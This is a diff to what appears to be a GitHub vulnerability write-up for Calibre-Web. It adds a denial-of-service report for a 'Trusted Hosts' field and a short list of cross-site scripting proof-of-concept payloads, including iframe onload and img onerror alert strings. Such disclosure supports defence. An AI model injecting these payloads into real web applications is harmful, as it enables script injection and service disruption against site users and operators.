@@ -8,6 +8,15 @@ After inserting and saving the xss payload, you need to check the page elements,
 ![xss inject](https://github.com/bikibiki/calibre-web-vulnerabilities/blob/main/images/inject-xss.png)
 ![alert](https://github.com/bikibiki/calibre-web-vulnerabilities/blob/main/images/alert.png)
 
-A denial of service in a "Trusted Hosts" field
+A denial of service in a "Trusted Hosts" field.
+
+The payload is such as :  
+```
+<iframe οnlοad=alert("xss");></iframe>
+<img src=1 οnerrοr=alert("xss");>
+";!-"<XSS>=&{()}
+maybe more payload could cause this problem.
+```
+
 ![dos-payload](https://github.com/bikibiki/calibre-web-vulnerabilities/blob/main/images/dos-payload.png)
 ![dos](https://github.com/bikibiki/calibre-web-vulnerabilities/blob/main/images/dos.png)
